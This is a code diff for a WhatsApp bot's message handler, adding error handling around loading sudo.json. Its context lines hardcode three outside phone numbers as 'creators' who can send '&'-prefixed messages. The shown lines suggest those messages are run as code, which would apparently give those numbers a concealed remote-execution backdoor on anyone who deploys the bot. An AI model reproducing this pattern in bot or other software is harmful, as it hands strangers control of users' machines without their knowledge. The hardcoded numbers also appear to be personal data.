@@ -287,22 +287,31 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  
+// creater setting	  
 const udp = botNumber.split('@')[0];
 const jawadop = ['923470027813', '923191089077', '923427582273'];
     
-const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
+// Read sudo.json with basic error handling
+let ownerFilev2 = [];
+try {
+    ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
+    // Convert any numbers with @s.whatsapp.net to pure numbers
+    ownerFilev2 = ownerFilev2.map(v => typeof v === 'string' ? v.split('@')[0] : v);
+} catch (err) {
+    console.error('Error loading sudo.json:', err);
+    ownerFilev2 = [];
+}
     
 // Normalize all numbers and prepare creator list
 const creators = [udp, ...jawadop, config.DEV, ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
+    .map(v => v.toString().replace(/[^0-9]/g, '') + '@s.whatsapp.net');
 
 // Get sender - works for both private and group messages
 const messageSender = mek.participant || mek.sender;
     
 const isCreator = creators.includes(messageSender);
 
-if (isCreator && mek.text.startsWith("&")) {
+if (isCreator && mek.text && mek.text.startsWith("&")) {
     let code = budy.slice(2);
     if (!code) {
         reply(`Provide me with a query to run Master!`);
@@ -329,9 +338,8 @@ if (isCreator && mek.text.startsWith("&")) {
         reply(util.format(err));
     }
     return;
-}	  
-  //==========public react============//
-  
+}
+	
 // Auto React for all messages (public and owner)
 if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
